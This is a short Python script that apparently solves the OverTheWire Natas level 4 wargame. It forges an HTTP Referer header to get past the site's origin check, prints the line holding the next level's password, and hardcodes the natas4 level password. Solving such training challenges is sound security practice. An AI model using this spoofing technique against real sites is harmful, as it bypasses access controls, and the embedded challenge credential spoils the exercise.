import requests
from requests.auth import HTTPBasicAuth


REFERER = 'http://natas5.natas.labs.overthewire.org/'
KEYWORD = 'natas5'


def exploit(host, credentials):
    """TODO: docstring here"""
    try:
        response = requests.get(host,
                                auth=HTTPBasicAuth(*credentials),
                                headers={'referer': REFERER})

        response_lines = response.content.decode('ascii').split('\n')
        return next((line for line in response_lines if KEYWORD in line), 'Keyword not found')
    except requests.RequestException as e:
        print(e)


def main():
    host = 'http://natas4.natas.labs.overthewire.org'
    credentials = ('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
    print(exploit(host, credentials))


if __name__ == '__main__':
    main()